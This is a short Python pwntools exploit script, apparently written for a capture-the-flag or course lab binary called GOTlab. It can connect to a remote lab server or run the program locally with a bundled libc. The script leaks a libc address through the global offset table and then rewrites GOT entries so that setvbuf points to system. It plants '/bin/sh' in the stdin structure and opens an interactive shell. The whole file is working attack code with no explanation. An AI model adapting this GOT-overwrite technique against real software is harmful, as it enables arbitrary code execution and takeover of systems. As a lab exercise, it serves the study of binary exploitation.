#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('140.112.31.97', '30103')
else:
    # p = process("./GOTlab")
    p = process(["./lib/ld-2.29.so", "./GOTlab"], env={"LD_PRELOAD" : "./lib/libc-2.29.so"})

# pause()

libc = ELF("./lib/libc-2.29.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


# libc_start_main
p.sendlineafter("address : ", str(0x403fe8))
libc.address = int(p.recvline()[:-1], 16) - libc.sym.__libc_start_main

# exit
p.sendlineafter("address : ", str(0x404038))
p.sendlineafter("value : ", str(0x4011ee))


# leak
p.sendlineafter("address : ", str(0x403fe8))
p.recvline()

# setvbuf
p.sendlineafter("address : ", str(0x404028))
p.sendlineafter("value : ", str(libc.sym.system))


# leak
p.sendlineafter("address : ", str(0x403fe8))
p.recvline()

# stdin
p.sendlineafter("address : ", str(libc.sym._IO_2_1_stdin_))
p.sendlineafter("value : ", str(u64('/bin/sh\0')))

p.interactive()
p.close()